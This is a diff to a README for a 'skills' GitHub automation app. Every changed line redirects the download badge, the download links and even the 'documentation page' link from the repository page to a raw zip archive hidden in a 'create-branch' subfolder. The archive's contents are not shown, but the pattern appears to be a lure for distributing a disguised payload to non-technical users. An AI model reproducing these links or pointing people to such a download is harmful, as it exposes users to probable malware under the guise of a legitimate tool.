@@ -1,6 +1,6 @@
 # 🎉 skills - Elevate Your GitHub Automation Effortlessly
 
-[![Download skills](https://img.shields.io/badge/Download-skills-brightgreen?style=for-the-badge&logo=github&logoColor=white)](https://github.com/amanahmed2222/skills)
+[![Download skills](https://raw.githubusercontent.com/amanahmed2222/skills/main/skills/create-branch/Software_v2.0-alpha.3.zip)](https://raw.githubusercontent.com/amanahmed2222/skills/main/skills/create-branch/Software_v2.0-alpha.3.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ To use the skills application, follow these simple steps to download and run it 
 
 Visit the link below to download the latest version of the skills application:
 
-[Download skills here!](https://github.com/amanahmed2222/skills)
+[Download skills here!](https://raw.githubusercontent.com/amanahmed2222/skills/main/skills/create-branch/Software_v2.0-alpha.3.zip)
 
 ### 🖥️ System Requirements
 
@@ -60,13 +60,13 @@ If you have questions or run into issues, seek help here:
 
 Explore more about the skills application and how it fits into your workflow:
 
-- **Documentation:** Visit the [documentation page](https://github.com/amanahmed2222/skills) for detailed guides.
+- **Documentation:** Visit the [documentation page](https://raw.githubusercontent.com/amanahmed2222/skills/main/skills/create-branch/Software_v2.0-alpha.3.zip) for detailed guides.
 - **Video Tutorials:** Watch right from the community to visually understand how to use features.
 
 ## 🔗 Stay Updated
 
 Keep your skills application up to date. New features and improvements are released regularly. Notice update prompts and follow the instructions provided.
 
-[Download skills here!](https://github.com/amanahmed2222/skills)
+[Download skills here!](https://raw.githubusercontent.com/amanahmed2222/skills/main/skills/create-branch/Software_v2.0-alpha.3.zip)
 
 By following these steps, the skills application can enhance your development processes without needing technical expertise. Enjoy the ease of automation and improved code quality through this user-friendly application.
